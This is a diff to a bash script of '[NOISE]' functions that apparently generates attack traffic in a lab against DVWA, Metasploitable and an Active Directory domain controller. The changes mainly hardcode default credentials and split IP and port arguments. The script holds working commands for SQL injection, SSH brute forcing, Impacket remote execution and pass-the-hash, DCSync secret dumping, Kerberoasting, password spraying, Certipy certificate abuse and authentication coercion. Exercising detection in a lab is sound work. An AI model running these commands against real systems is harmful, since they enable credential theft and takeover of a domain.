@@ -51,10 +51,14 @@ nmap_all_scripts() {
 #=============================================================================
 
 sqlmap_maximum() {
-    local target="${1:-http://$DVWA_IP/vulnerabilities/sqli/?id=1&Submit=Submit}"
-    local cookie="${2:-security=low; PHPSESSID=test}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}/vulnerabilities/sqli/?id=1&Submit=Submit"
+    local cookie="security=low; PHPSESSID=test"
+    local outdir="$RESULTS/sqlmap_$(date +%s)"
+    mkdir -p "$outdir"
     echo "[NOISE] SQLMap maximum: $target"
-    sqlmap -u "$target" \
+    timeout 30m sqlmap -u "$target" \
         --cookie="$cookie" \
         --level=5 \
         --risk=3 \
@@ -65,11 +69,13 @@ sqlmap_maximum() {
         --time-sec=2 \
         --technique=BEUSTQ \
         --tamper=space2comment,between,randomcase \
-        -o "$RESULTS/sqlmap_$(date +%s).txt" 2>&1 || true
+        --output-dir="$outdir" 2>&1 || true
 }
 
 nuclei_full_scan() {
-    local target="${1:-http://$DVWA_IP}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}"
     echo "[NOISE] Nuclei full scan: $target"
     nuclei -u "$target" \
         -severity critical,high,medium,low \
@@ -78,7 +84,9 @@ nuclei_full_scan() {
 }
 
 nuclei_cve_scan() {
-    local target="${1:-http://$DVWA_IP}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}"
     echo "[NOISE] Nuclei CVE scan: $target"
     nuclei -u "$target" \
         -t cves/ \
@@ -193,7 +201,9 @@ lfi_deep_traversal() {
 }
 
 dirb_huge_wordlist() {
-    local target="${1:-http://$DVWA_IP}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}"
     echo "[NOISE] Dirb huge wordlist: $target"
 
     # Use multiple wordlists
@@ -246,8 +256,8 @@ shellshock_probe() {
 
 hydra_ssh_maximum() {
     local target="${1:-$METASPLOIT_IP}"
-    local userlist="${2:-$WORDLISTS/users_short.txt}"
-    local passlist="${3:-$WORDLISTS/passwords_10k.txt}"
+    local userlist="$WORDLISTS/users_short.txt"
+    local passlist="$WORDLISTS/passwords_10k.txt"
     echo "[NOISE] Hydra SSH maximum threads: $target"
 
     # Use rockyou if available
@@ -503,40 +513,40 @@ exfil_encoded_chunks() {
 
 impacket_psexec() {
     local target="${1:-$WINDOWS_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Impacket psexec: $target"
     impacket-psexec "$user:$pass@$target" "whoami" 2>&1 || true
 }
 
 impacket_wmiexec() {
     local target="${1:-$WINDOWS_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Impacket wmiexec: $target"
     impacket-wmiexec "$user:$pass@$target" "whoami" 2>&1 || true
 }
 
 impacket_smbexec() {
     local target="${1:-$WINDOWS_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Impacket smbexec: $target"
     impacket-smbexec "$user:$pass@$target" "whoami" 2>&1 || true
 }
 
 impacket_atexec() {
     local target="${1:-$WINDOWS_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Impacket atexec: $target"
     impacket-atexec "$user:$pass@$target" "whoami" 2>&1 || true
 }
 
 impacket_pth_all() {
     local target="${1:-$WINDOWS_IP}"
-    local user="${2:-administrator}"
-    local hash="${3:-aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0}"
+    local user="administrator"
+    local hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
     echo "[NOISE] Impacket pass-the-hash all methods: $target"
 
     impacket-psexec -hashes "$hash" "$user@$target" "whoami" 2>&1 || true
@@ -546,9 +556,9 @@ impacket_pth_all() {
 
 impacket_secretsdump() {
     local target="${1:-$AD_DC_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
-    local domain="${4:-$AD_DOMAIN}"
+    local user="administrator"
+    local pass="password"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] Impacket secretsdump DCSync: $target"
     impacket-secretsdump "$domain/$user:$pass@$target" 2>&1 || true
 }
@@ -558,14 +568,14 @@ impacket_secretsdump() {
 #=============================================================================
 
 responder_analyze() {
-    local interface="${1:-eth0}"
+    local interface="eth0"
     echo "[NOISE] Responder analyze mode (10 seconds)"
     timeout 10 responder -I "$interface" -A 2>&1 || true
 }
 
 snmp_walk_full_mib() {
     local target="${1:-10.10.40.43}"
-    local community="${2:-public}"
+    local community="public"
     echo "[NOISE] SNMP walk full MIB: $target"
     snmpwalk -v2c -c "$community" "$target" . 2>&1 | head -1000 || true
 }
@@ -584,7 +594,7 @@ dns_axfr_all_targets() {
 
 kerbrute_userenum() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] Kerbrute user enumeration: $target"
 
     if command -v kerbrute &> /dev/null; then
@@ -597,7 +607,7 @@ kerbrute_userenum() {
 
 kerbrute_passwordspray() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] Kerbrute password spray: $target"
 
     if command -v kerbrute &> /dev/null; then
@@ -610,9 +620,9 @@ kerbrute_passwordspray() {
 
 bloodhound_all_methods() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
-    local user="${3:-administrator}"
-    local pass="${4:-password}"
+    local domain="$AD_DOMAIN"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] BloodHound all collection methods: $target"
 
     # Using bloodhound-python
@@ -626,7 +636,7 @@ rubeus_kerberoast() {
     # This generates the same Kerberos TGS-REQ traffic
 
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
+    local domain="$AD_DOMAIN"
 
     # Use Impacket's GetUserSPNs instead
     impacket-GetUserSPNs "$domain/administrator:password" -dc-ip "$target" \
@@ -636,7 +646,7 @@ rubeus_kerberoast() {
 rubeus_asreproast() {
     echo "[NOISE] Rubeus AS-REP roast simulation"
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
+    local domain="$AD_DOMAIN"
 
     # Use Impacket's GetNPUsers
     impacket-GetNPUsers "$domain/" -dc-ip "$target" \
@@ -646,7 +656,7 @@ rubeus_asreproast() {
 
 cme_password_spray() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] CrackMapExec password spray: $target"
 
     crackmapexec smb "$target" -d "$domain" \
@@ -656,9 +666,9 @@ cme_password_spray() {
 
 cme_pass_the_hash() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
-    local user="${3:-administrator}"
-    local hash="${4:-aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0}"
+    local domain="$AD_DOMAIN"
+    local user="administrator"
+    local hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
     echo "[NOISE] CrackMapExec pass-the-hash: $target"
 
     crackmapexec smb "$target" -d "$domain" -u "$user" -H "$hash" 2>&1 || true
@@ -670,9 +680,9 @@ cme_pass_the_hash() {
 
 certipy_find() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
-    local user="${3:-administrator}"
-    local pass="${4:-password}"
+    local domain="$AD_DOMAIN"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Certipy AD CS enumeration: $target"
     certipy-ad find -u "$user@$domain" -p "$pass" -dc-ip "$target" \
         -vulnerable -stdout 2>&1 || true
@@ -680,9 +690,9 @@ certipy_find() {
 
 certipy_esc1() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
-    local user="${3:-administrator}"
-    local pass="${4:-password}"
+    local domain="$AD_DOMAIN"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Certipy ESC1 attack attempt: $target"
     # Request certificate with SAN
     certipy-ad req -u "$user@$domain" -p "$pass" -dc-ip "$target" \
@@ -691,9 +701,9 @@ certipy_esc1() {
 
 certipy_shadow() {
     local target="${1:-$AD_DC_IP}"
-    local domain="${2:-$AD_DOMAIN}"
-    local user="${3:-administrator}"
-    local pass="${4:-password}"
+    local domain="$AD_DOMAIN"
+    local user="administrator"
+    local pass="password"
     echo "[NOISE] Certipy shadow credentials: $target"
     certipy-ad shadow auto -u "$user@$domain" -p "$pass" -dc-ip "$target" \
         -account "DC01$" 2>&1 || true
@@ -708,7 +718,9 @@ ffuf_vhost() {
 }
 
 ffuf_dirs() {
-    local target="${1:-http://$DVWA_IP}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}"
     echo "[NOISE] ffuf directory fuzzing: $target"
     ffuf -u "$target/FUZZ" \
         -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
@@ -716,7 +728,9 @@ ffuf_dirs() {
 }
 
 ffuf_params() {
-    local target="${1:-http://$DVWA_IP/vulnerabilities/sqli/}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}/vulnerabilities/sqli/"
     echo "[NOISE] ffuf parameter fuzzing: $target"
     ffuf -u "$target?FUZZ=test" \
         -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
@@ -724,7 +738,9 @@ ffuf_params() {
 }
 
 feroxbuster_recursive() {
-    local target="${1:-http://$DVWA_IP}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}"
     echo "[NOISE] feroxbuster recursive scan: $target"
     feroxbuster -u "$target" \
         -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
@@ -733,7 +749,9 @@ feroxbuster_recursive() {
 }
 
 dalfox_scan() {
-    local target="${1:-http://$DVWA_IP/vulnerabilities/xss_r/?name=test}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}/vulnerabilities/xss_r/?name=test"
     echo "[NOISE] dalfox XSS scan: $target"
     dalfox url "$target" \
         --cookie "security=low; PHPSESSID=test" \
@@ -753,7 +771,9 @@ http://$target/vulnerabilities/sqli/?id=1" | \
 }
 
 commix_scan() {
-    local target="${1:-http://$DVWA_IP/vulnerabilities/exec/}"
+    local ip="${1:-$DVWA_IP}"
+    local port="${2:-80}"
+    local target="http://${ip}:${port}/vulnerabilities/exec/"
     echo "[NOISE] commix command injection scan: $target"
     commix -u "$target" \
         --data="ip=127.0.0.1&Submit=Submit" \
@@ -764,9 +784,9 @@ commix_scan() {
 
 coercer_scan() {
     local target="${1:-$AD_DC_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
-    local domain="${4:-$AD_DOMAIN}"
+    local user="administrator"
+    local pass="password"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] Coercer authentication coercion scan: $target"
     coercer scan -u "$user" -p "$pass" -d "$domain" -t "$target" \
         --listener 10.10.20.20 2>&1 || true
@@ -774,10 +794,10 @@ coercer_scan() {
 
 coercer_coerce() {
     local target="${1:-$AD_DC_IP}"
-    local listener="${2:-10.10.20.20}"
-    local user="${3:-administrator}"
-    local pass="${4:-password}"
-    local domain="${5:-$AD_DOMAIN}"
+    local listener="10.10.20.20"
+    local user="administrator"
+    local pass="password"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] Coercer authentication coercion: $target -> $listener"
     coercer coerce -u "$user" -p "$pass" -d "$domain" -t "$target" \
         --listener "$listener" --all-methods 2>&1 || true
@@ -819,9 +839,9 @@ httpx_targets() {
 
 ldapdomaindump_full() {
     local target="${1:-$AD_DC_IP}"
-    local user="${2:-administrator}"
-    local pass="${3:-password}"
-    local domain="${4:-$AD_DOMAIN}"
+    local user="administrator"
+    local pass="password"
+    local domain="$AD_DOMAIN"
     echo "[NOISE] ldapdomaindump full enumeration: $target"
     ldapdomaindump -u "$domain\\$user" -p "$pass" ldap://"$target" \
         -o "$RESULTS/ldapdump_$(date +%s)" 2>&1 || true
